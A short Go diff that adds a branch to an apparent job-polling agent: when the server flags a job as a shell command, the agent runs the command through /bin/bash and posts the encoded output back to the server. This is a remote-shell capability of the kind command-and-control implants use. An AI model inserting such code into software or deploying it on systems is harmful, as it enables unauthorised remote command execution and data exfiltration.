@@ -176,6 +176,17 @@ func checkReq(req Response, url string) {
 
 				postOut(url, createBody(jsonBody))
 			}
+		} else if req.Jobs[i].Shellcommand == true {
+			url := fmt.Sprintf(url, req.Jobs[i].Id)
+
+			output := execCmd([]string{"/bin/bash", "-c", req.Jobs[i].Command})
+
+			jsonBody := Post{
+				Comtoken: Comtoken,
+				Output:   encodeOutput(output),
+			}
+
+			postOut(url, createBody(jsonBody))
 		}
 	}
 }
